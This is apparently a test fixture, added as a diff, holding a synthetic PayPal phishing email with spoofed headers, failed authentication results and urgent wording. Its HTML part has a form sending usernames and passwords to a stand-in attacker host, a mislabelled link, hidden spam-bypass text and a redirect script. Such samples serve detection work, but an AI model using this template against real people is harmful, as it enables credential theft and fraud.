@@ -1,0 +1,68 @@
+From: "PayPal Security" <security@paypa1-support.com>
+To: victim@example.com
+Subject: URGENT: Your account has been suspended - Action Required
+Date: Mon, 01 Jan 2024 10:00:00 +0000
+Message-ID: <fake-id-12345@paypa1-support.com>
+Return-Path: <bounce@totally-different-domain.ru>
+Reply-To: collect@evil-harvest.com
+X-Mailer: PHPMailer 6.5.0
+X-Originating-IP: 185.220.101.47
+X-Campaign-ID: phish-campaign-001
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Part_boundary_001"
+Authentication-Results: mx.example.com;
+    spf=fail (sender IP is 185.220.101.47) smtp.mailfrom=paypa1-support.com;
+    dkim=fail header.d=paypa1-support.com;
+    dmarc=fail action=none header.from=paypa1-support.com
+
+------=_Part_boundary_001
+Content-Type: text/plain; charset=UTF-8
+
+URGENT ACTION REQUIRED - Your PayPal account has been suspended!
+
+Dear Customer,
+
+We have detected unusual activity on your account. Your account will be 
+permanently suspended within 24 hours unless you verify your identity immediately.
+
+Click here to verify your account now: http://paypal-verify.totally-evil.com/login
+
+Please provide your credentials and credit card information to restore access.
+
+This is a limited time offer - act now before your account expires!
+
+PayPal Security Team
+
+------=_Part_boundary_001
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>
+<p style="display:none">filler text to bypass spam filters aaaaaaaaa bbbbbbbbb</p>
+<h1>URGENT: Account Suspended</h1>
+<p>Dear Customer,</p>
+<p>We have detected <strong>unusual activity</strong> on your account. 
+Your account will be <strong>permanently suspended</strong> within 24 hours 
+unless you <strong>verify your identity immediately</strong>.</p>
+
+<p><a href="http://185.220.101.47/phish/paypal/login.php">
+Click here to verify - http://www.paypal.com/verify
+</a></p>
+
+<p><a href="http://bit.ly/3xEvIlL1nk">Secure Login Portal</a></p>
+
+<form action="http://evil-harvest.com/steal.php" method="POST">
+  <input type="text" name="username" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Verify Account">
+</form>
+
+<script>
+document.location = 'http://tracker.evil.com/track?id=12345';
+</script>
+
+<p style="color: white; font-size: 0px;">hidden text for spam bypass</p>
+</body>
+</html>
+
+------=_Part_boundary_001--
